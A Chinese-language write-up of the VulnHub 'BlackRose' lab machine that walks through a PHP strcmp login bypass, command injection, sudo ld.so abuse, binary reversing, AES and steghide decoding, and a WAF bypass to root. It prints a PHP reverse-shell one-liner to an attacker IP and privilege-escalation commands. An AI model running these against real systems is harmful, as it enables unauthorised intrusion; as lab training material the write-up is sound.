## **0x01 下载**

下载地址：https://www.vulnhub.com/entry/blackrose-1,509/

由于国外访问较慢，这里下载后的文件已经传到了网盘

网盘链接：

https://pan.baidu.com/s/1FGc7RPXnerkcydqN9i86Gw

提取码： **5whz**

PS：下载vulnhub里面的镜像可以使用FDM这款工具，挂到机器上慢慢下。

##  **0x02 安装**

这里推荐直接使用virtualbox，因为VM安装会报如下错误。

![](https://image.3001.net/images/20200908/1599552064.png!small)

这里网上是有解决方案的，但是直接用virtualbox他不香么。直接导入即可。

导入后选择内部网络intent就好，这个是一个独立的内网，

所以说我们的物理机是无法访问到靶机的，需要把其他的虚拟机添加到这个网络中。

例如kali，添加时也选择内部网络，然后配置kali的IP就行，这里因为在内网中没有相关DHCP服务器，所以需要手工分配静态IP，配置到相关网段即可。

##  **0x03 知识点**

### 3.1 PHP strcmp()函数

 **int strcmp** ( string $str1 , string $str2 )，用来比较两个字符串的值，

参数 str1第一个字符串。

str2第二个字符串。如果 str1 小于 str2 返回 < 0；如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。

当传入的值不符合期望的类型就会报错，在php5.3以前，在报错信息显示后，将return 0，这也就导致了漏洞的产生。

后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。

### 3.2 passwordverify与passwordhash函数

    
    
    string password_hash ( string $password , int $algo [, array $options ] )

 **PASSWORD_DEFAUL** T - 使用 bcrypt 算法 (PHP 5.5.0 默认)

 **PASSWORD_BCRYPT** \- 使用 CRYPT_BLOWFISH 算法创建散列。

 **PASSWORD_AR** **GON2I** \- 使用 Argon2 散列算法创建散列。

    
    
    bool password_verify ( string $password , string $hash )

 **password_verify()** 函数用于验证密码是否和散列值匹配。

### 3.3 ld.so滥用

ld.so 是 Unix（https://baike.baidu.com/item/Unix/21994）或类Unix系统上的动态链接器。

当应用程序需要使用动态链接库里的函数时，由ld.so负责加载。

在渗透时可以通过修改环境变量，让高权限程序加载恶意动态链接库，从而获取更高的权限。

### 3.4 二进制文件逆向与AES解密

文件的逆向没什么好讲的，拖进去直接就能看到代码逻辑。

后边所用到的AES解密是需要去猜测的，一般有key的话就是对称加密算法，常见的对称加密算法有DES、3DES、Blowfish、IDEA、RC
4、RC5、RC6 和 AES。

这个没什么捷径，只能尝试去一个一个猜解。

同时 **秘钥长度为8，转换成字节就是32位** ，通过这个信息缩小些范围。

### 3.5 图片隐写工具

Steghide是一个可以将文件隐藏到图片或音频中的工具

安装：apt install steghide

隐藏文件

steghide embed -cf [文件载体] -ef [待隐藏文件]

查看文件信息

steghide info [文件]

提取隐藏信息

steghide extract -sf [文件]

### 3.6 简单的WAF绕过

php中可以使用（）进行连接绕过检查

### 3.7 linux权限提升

参考网站：https://payatu.com/guide-linux-privilege-escalation

对linux中的提权总结的挺好的，在玩靶机的过程中，主要使用了SUID的查找，配置不当和特权命令来提升权限。

##  **0x04 探测 &测试**

这里作者已经给出了IP地址：192.168.1.21。

直接ping一下。确定可以连通后就可以开始玩了。

日常先扫一波端口及服务。

开了22、80、3306，竟然开放3306出来，看我拿出远程溢出0day，直接打3306拿到权限。（为什么有牛在飞）。

![1599552168.png!small](https://image.3001.net/images/20200908/1599552168.png!small)

正常开始搞，22和3306可以走一波爆破，但是按一般的渗透流程不建议使用，毕竟动作太大了。

其次老外的口令字典还是不太一样的，懒得去找了。还是从web入手看看。

打开迎面一个登录和注册的框框。

![1599552216.png!small](https://image.3001.net/images/20200908/1599552216.png!small)

那么能想到的测试点无非就是：

  * 登录绕过（逻辑问题，语言特性）

  * sql注入（万能密码）

  * 弱口令（爆破）

  * 二次注入

  * 注册覆盖

  * 未授权访问（目录扫描）

尝试注册、进去一番摸索，并没有发现什么有什么可以值得利用的地方，点击页面发现功能点需要admin用户才能操作，那先在的目标就是 **获取admin权限**

![](https://image.3001.net/images/20200908/1599552263.png!small)

经过一番搜索，发现登录时使用php的一个特性去绕过了登录判断，就是 **PHP strcmp()**

![](https://image.3001.net/images/20200908/1599552274.png!small)

然后就可以成功的登录进去了

![](https://image.3001.net/images/20200908/1599552284.png!small)

##  **0x05 服务器权限获取**

### 5.1 加密与执行

在页面上有一个命令执行的窗口，在尝试了几个命令后，发现只有whoami命令可以执行，

其次因为有csrftoken这个参数的原因，他会频繁刷新，如果没有及时执行命令时就会一直timeout。

执行后可以看到是一个www-data的权限。现在需要搞清楚签名的含义。

![1599552334.png!small](https://image.3001.net/images/20200908/1599552334.png!small)

kali自带两个hash算法识别工具hashid和hash-identifier。然而两个都没有识别出来。

![](https://image.3001.net/images/20200908/1599552345.png!small)

不过好在我们已经获取了密文内容，那么使用john跑一下就能识别了。

识别出来这个签名的加密方式bcrypt。然后就可以利用这个进行命令执行了。

![](https://image.3001.net/images/20200908/1599552358.png!small)

找到一个在线 加密网站（http://passwordhashing.com/），

在尝试几个命令后准备反弹shell，一般linux下反弹shell操作无非也就那几种。

这里推荐一个 shell生成网站（https://krober.biz/misc/reverse_shell.php）。

![1599552370.png!small](https://image.3001.net/images/20200908/1599552370.png!small)

### 5.2 权限获取

先用nc起一个监听，然后抓包改执行的命令，发现执行命令时老报错误，

最终使用遍历的方法获取到了一个shell：

    
    
    php -r '$s=fsockopen("1921.68.1.2",4444);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'

![](https://image.3001.net/images/20200908/1599552385.png!small)

转换成标准的输入输出：python -c 'import pty; pty.spawn("/bin/bash")'

##  **0x06 权限提升 - yourname**

### 6.1 www-data到delx

linux权限提升的几种方式：

内核提权，SUID提权，高权限应用，sudo等。

这里不存在内核漏洞

先找一下 **find / -perm -u = s -type f 2 > / dev / null**

![1599552671.png!small](https://image.3001.net/images/20200908/1599552671.png!small)

然而并没有什么可以值得利用的，接着查看sudo权限和用户sudo -l

![](https://image.3001.net/images/20200908/1599552756.png!small)

发现了delx用户有动态链接库文件ld.so,执行sudo -u delx /bin/ld.so /bin/bash，

获取delx权限

### 6.2 加密与解密

即可切换到delx用户下，

执行 **find / -type f -user delx 2 >/dev/null**，找到了一些有趣的文件

![](https://image.3001.net/images/20200908/1599552766.png!small)

showpasswd是一个执行文件，但实际上执行后会显示一条消息。

![](https://image.3001.net/images/20200908/1599552777.png!small)

遇到这种情况就要分析代码了。使用scp命令将该文件传到本机

![](https://image.3001.net/images/20200908/1599552787.png!small)

使用ida打开，很直观的就可以看到其代码逻辑，执行了一系列的字符串判断。

![](https://image.3001.net/images/20200908/1599552831.png!small)

简单分析后得到了 **gqSFGqAJ** 字符串。

然而这个时候并不知道这个字符串有什么用途，又到了脑洞时间。

在文件还有一长串字符串没有用到，猜测是需要使用字符串当key去解。

![](https://image.3001.net/images/20200908/1599552841.png!small)

一番搜索后，发现是AES加密，

使用 在线网站（http://asencryption.net/）进行解密，

可以得到一个字符串： **RkZiPVkvxykJVOmxBmitBPeJXqFuxM**

![](https://image.3001.net/images/20200908/1599552854.png!small)

### 6.3 图片隐写获取密码

这里有一个点，就是首页背景图片中也隐藏了信息，需要用上面的key进行解密。

![](https://image.3001.net/images/20200908/1599552863.png!small)

查看内容为： **s)M8Z=7|8/ &YY-zK5L$.w3Su'Q@nGR**，

这个密码看起来依旧是加密的，经过查找，发现是 **rot47** 。

解密出来是： **DX|g+lfMg^U**\Kzd{S]Hb$FV"o?v#** 。

![](https://image.3001.net/images/20200908/1599552874.png!small)

使用该密码登入yourname这个用户，获取第一个文件。

![](https://image.3001.net/images/20200908/1599552883.png!small)

##  **0x07 权限提升 - root**

依旧先使用sudo -l命令查看相关命令执行权限，发现blackrose这个命令，

执行后发现还是无法读取root文件。

![](https://image.3001.net/images/20200908/1599552899.png!small)

看起来是存在了某种限制，经过一番搜索后，发现可以使用PHP后缀文件。

发现这个程序还过滤了一些高危函数。

![](https://image.3001.net/images/20200908/1599552909.png!small)

绕过以后成功获取root权限

![](https://image.3001.net/images/20200908/1599552920.png!small)

##  **0x08 结语**

靶场的质量挺高的，CTF说实话跟渗透的差别还是有的，解这个靶机跟做题差不多，需要思考作者的用意。

另外就是平时知识的积累，偶尔渗透累了，做做靶机涨涨技术也是不错滴。

